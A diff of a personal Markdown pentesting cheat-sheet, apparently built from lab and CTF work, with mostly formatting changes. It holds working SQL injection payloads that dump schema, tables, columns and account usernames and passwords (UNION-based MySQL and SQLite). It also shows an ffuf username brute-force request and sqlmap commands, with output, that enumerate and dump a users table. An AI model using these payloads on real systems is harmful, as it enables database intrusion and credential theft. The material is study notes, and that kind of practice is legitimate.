@@ -1,34 +1,38 @@
-
 ### UNION BASED SQLI
-info gathering 
+
+info gathering
+
 ```
 1'union select 1,2,3,databases(),user(),version(),7 -- -
 ```
 
 tables name dump
+
 ```
-'union select 1,2,3,4,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'host1244535_siska'),version(),7 -- - 
+'union select 1,2,3,4,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'host1244535_siska'),version(),7 -- -
 ```
 
 column dump
+
 ```
 'union select 1,2,3,4,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'host1244535_siska'),version(),7 -- -
 ```
 
 table data dump
+
 ```
 'union select 1,2,3,4,(SELECT GROUP_CONCAT(username) from host1244535_siska.accounts ),version(),7 -- -
 ```
+
 or
+
 ```
 'union select 1,2,3,4,(SELECT username from host1244535_siska.accounts ),version(),7 -- -
 ```
 
-
 ref:-
 https://www.hackingloops.com/sql-injection-union-based-exploitation-part-2-the-injection/
 https://book.hacktricks.xyz/pentesting-web/sql-injection
-
 
 - [DVWA Easy Union based sqli](./DVWA_Easy_Manualy_Dump.md)
 - [DVWA Medium Union based sqli](./DVWA_Medium_Manualy_Dump.md)
@@ -36,9 +40,10 @@ https://book.hacktricks.xyz/pentesting-web/sql-injection
 ### Username Brutforce with FFUF
 
 simple request
-![Alt text](image.png)
+![Username_Brutforce_with_FFUF](Images/Username_Brutforce_with_FFUF.png)
 
-save  req to req.txt
+save req to req.txt
+
 ```
 POST / HTTP/1.1
 Host: 10.10.128.5
@@ -58,12 +63,13 @@ username=FUZZ'AND+1=1+--+-&password=a
 ```
 
 run below FFUF command
+
 ```
 ffuf -request req.txt -u http://10.10.128.5/ -w ~/Tools/SecLists/Usernames/xato-net-10-million-usernames-dup.txt
 ```
+
 ![[Pasted image 20230903233728.png]]
 NOTE:- we might need to pass -u with url to use http or https
-
 
 python script :-
 https://github.com/BhattJayD/LessonLearned-BruteForce-Script
@@ -82,29 +88,17 @@ username=admin&password=aa'union select 1,sqlite_version() -- -
 ```
 
 ```json
-[
-  [
-    1, 
-    "3.26.0"
-  ]
-]
-
+[[1, "3.26.0"]]
 ```
 
-##### 2nd step  TABLE NAME EXTRACTION
+##### 2nd step TABLE NAME EXTRACTION
 
 ```
 username=admin&password=aa'union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- -
 ```
 
 ```json
-[
-  [
-    1, 
-    "users,notes"
-  ]
-]
-
+[[1, "users,notes"]]
 ```
 
 ##### 3rd step COLUMN NAME EXTRACTION
@@ -122,7 +116,6 @@ username=admin&password=aa'union select 1,sql from sqlite_master where type!='me
 ]
 ```
 
-
 ##### 4rd step DATA EXTRACTION FROM COLUMN
 
 ```sqlite
@@ -131,26 +124,11 @@ username=admin&password=aa'union select 1,username from users limit 10 -- -
 
 ```json
 [
-  [
-    1, 
-    "julias"
-  ], 
-  [
-    1, 
-    "linda"
-  ], 
-  [
-    1, 
-    "marnie"
-  ], 
-  [
-    1, 
-    "mary_ann"
-  ], 
-  [
-    1, 
-    "vincent"
-  ]
+  [1, "julias"],
+  [1, "linda"],
+  [1, "marnie"],
+  [1, "mary_ann"],
+  [1, "vincent"]
 ]
 ```
 
@@ -161,12 +139,11 @@ username=admin&password=aa'union select (group_concat(password)),(group_concat(u
 ```json
 [
   [
-    "continue...,Red,Orange,Green,Yellow ", 
+    "continue...,Red,Orange,Green,Yellow ",
     "mary_ann,julias,vincent,linda,marnie"
   ]
 ]
 ```
-
 
 ### Use full sql commands
 
@@ -179,26 +156,34 @@ select * from table \G;
 ### SQLMAP
 
 ##### read from file
+
 ```bash
 sqlmap -r file.txt
 ```
+
 ##### Ignore Code
+
 When server gives specific status code and error out use below command
+
 ```
 sqlmap -r file.txt --ignore-code 401
 ```
 
 ##### Enum with sqlmap
+
 1.  DB enum
-2. Table enum
-3. Columns emum
-4. DB Dump
+2.  Table enum
+3.  Columns emum
+4.  DB Dump
 
 DB enum
+
 ```bash
 sqlmap -r KOTP.txt --ignore-code 401 --dbs
 ```
-output 
+
+output
+
 ```bash
         ___
        __H__
@@ -213,7 +198,7 @@ output
 
 [21:12:21] [INFO] parsing HTTP request from 'KOTP.txt'
 custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
-[21:12:23] [INFO] resuming back-end DBMS 'mysql' 
+[21:12:23] [INFO] resuming back-end DBMS 'mysql'
 [21:12:23] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -252,10 +237,13 @@ available databases [3]:
 ```
 
 Table Enum
+
 ```bash
 sqlmap -r KOTP.txt --ignore-code 401 -D korp_terminal --tables
 ```
+
 Output
+
 ```bash
         ___
        __H__
@@ -270,7 +258,7 @@ Output
 
 [21:12:38] [INFO] parsing HTTP request from 'KOTP.txt'
 custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
-[21:12:40] [INFO] resuming back-end DBMS 'mysql' 
+[21:12:40] [INFO] resuming back-end DBMS 'mysql'
 [21:12:40] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -308,11 +296,13 @@ Database: korp_terminal
 ```
 
 Columns enum
+
 ```bash
 sqlmap -r KOTP.txt --ignore-code 401 -D korp_terminal -T users --columns
 ```
 
 output
+
 ```bash
         ___
        __H__
@@ -327,7 +317,7 @@ output
 
 [21:16:13] [INFO] parsing HTTP request from 'KOTP.txt'
 custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
-[21:16:16] [INFO] resuming back-end DBMS 'mysql' 
+[21:16:16] [INFO] resuming back-end DBMS 'mysql'
 [21:16:16] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -373,11 +363,13 @@ Table: users
 ```
 
 Dump the DB
+
 ```bash
 sqlmap -r KOTP.txt --ignore-code 401 -D korp_terminal -T users --dump
 ```
 
 output
+
 ```bash
         ___
        __H__
@@ -392,7 +384,7 @@ output
 
 [21:17:18] [INFO] parsing HTTP request from 'KOTP.txt'
 custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
-[21:17:20] [INFO] resuming back-end DBMS 'mysql' 
+[21:17:20] [INFO] resuming back-end DBMS 'mysql'
 [21:17:20] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
